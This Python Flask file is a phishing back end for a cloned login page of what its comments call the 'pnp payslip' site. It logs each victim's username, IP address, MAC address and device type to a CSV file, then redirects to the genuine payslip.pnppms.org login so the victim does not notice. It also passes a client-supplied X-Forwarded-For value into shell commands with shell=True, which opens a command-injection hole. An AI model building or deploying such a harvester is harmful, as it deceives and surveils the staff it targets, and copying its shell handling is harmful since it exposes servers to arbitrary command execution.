from flask import Flask, render_template, request, redirect #server for python 
import csv # getting the configuration of csv
import os # configuration/ portable way of using operating system
import time #getting the time
import subprocess #allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.
import platform #used to retrieve as much possible information about the platform
import re #provides regular expression matching operations

app = Flask(__name__)

# Route for rendering the login page using html
@app.route('/')
def index():
    return render_template('index.html')

"""
A function designed to retrieve 
and return the client's actual IP address.
"""
def get_client_ip():
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0]
    elif request.headers.get("X-Real-IP"):
        ip = request.headers.get("X-Real-IP")
    elif request.environ.get('HTTP_X_FORWARDED_FOR'):
        ip = request.environ.get('HTTP_X_FORWARDED_FOR').split(',')[0]
    else:
        ip = request.remote_addr
    return ip

"""
Function to determine if the client is using a mobile or desktop device
depending on their current device they try to log in.
"""
def get_device_type():
    user_agent = request.headers.get('User-Agent', '').lower()
    if any(mobile in user_agent for mobile in ['iphone', 'android', 'mobile', 'tablet']):
        return 'Mobile'
    return 'Desktop'

# function to fetch their mac address of a given ip address
def get_mac_address(ip_address):
    if ip_address == '127.0.0.1':
        return 'localhost'

    """
    Handle exception function that depends on their device they currently using and 
    must be reachable depending on their os.
    """

    try:
        # ensuring the ip is reachable by sending ping
        if platform.system().lower() == "windows":
            ping_cmd = f"ping -n 1 {ip_address}"
            subprocess.call(ping_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # extract mac address using arp command
            output = subprocess.check_output(f"arp -a {ip_address}", shell=True).decode()
            mac_matches = re.findall(r"([0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2})", output)
            if mac_matches:
                return mac_matches[0].upper()
        else:
            # For linux user/macos users
            ping_cmd = f"ping -c 1 {ip_address}"
            subprocess.call(ping_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # get the complete mac address
            output = subprocess.check_output(f"arp -n {ip_address}", shell=True).decode()
            mac_matches = re.findall(r"([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})", output)
            if mac_matches:
                return mac_matches[0].upper()
            
        # Alternative method for Linux
        if platform.system().lower() != "windows":
            try:
                output = subprocess.check_output(f"ip neigh show {ip_address}", shell=True).decode()
                mac_matches = re.findall(r"([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})", output)
                if mac_matches:
                    return mac_matches[0].upper() 
            except:
                pass

        return ''  
    except Exception as e:
        print(f"Error getting MAC address: {str(e)}")  
        return ''  

# routing for handle requests
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    # Note: Still receiving password from form but not using it
    
    # getting client's IP address
    ip_address = get_client_ip()
    
    # getting their mac address and device type
    mac_address = get_mac_address(ip_address)
    device_type = get_device_type()
    
    if not username:
        return render_template('index.html', error="Please enter your username")
    
    # save the credentials containing the names in every column
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    save_to_csv(username, timestamp, ip_address, mac_address, device_type)
    
    # looping from copycat-ed ui/ux of pnp payslip to it's original payslip
    return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2F")

def save_to_csv(username, timestamp, ip_address, mac_address, device_type):
    """ 
    Get the directory where the script is located. The name for stacking credentials is 
    data.csv
    """
    script_dir = os.path.dirname(os.path.abspath(__file__))
    csv_path = os.path.join(script_dir, 'data.csv')
    
    try:
        file_exists = os.path.isfile(csv_path)
        
        with open(csv_path, 'a', newline='\n') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)

            """
            if file does not exist or is empty, it will write header
            """
            if not file_exists or os.stat(csv_path).st_size == 0:
                writer.writerow(['username', 'timestamp', 'ip_address', 'mac_address', 'device_type'])
                csvfile.flush()

            # append login credentials (without password)
            writer.writerow([username, timestamp, ip_address, mac_address, device_type])
            csvfile.flush()
    except PermissionError:
        
        """
        if writing to default location fails, it will go alternative way/append
        to navigate it's location request.
        """
        fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
        with open(fallback_path, 'a', newline='\n') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
            
            if not os.path.exists(fallback_path) or os.stat(fallback_path).st_size == 0:
                writer.writerow(['username', 'timestamp', 'ip_address', 'mac_address', 'device_type'])
                csvfile.flush()
            
            writer.writerow([username, timestamp, ip_address, mac_address, device_type])
            csvfile.flush()

if __name__ == '__main__':
    #run server 
    app.run(
        host='0.0.0.0',  
        port=5000,       # You can change this port if needed. do not remove for handling port.
        debug=False      # set to False for production. do not remove this.
    ) 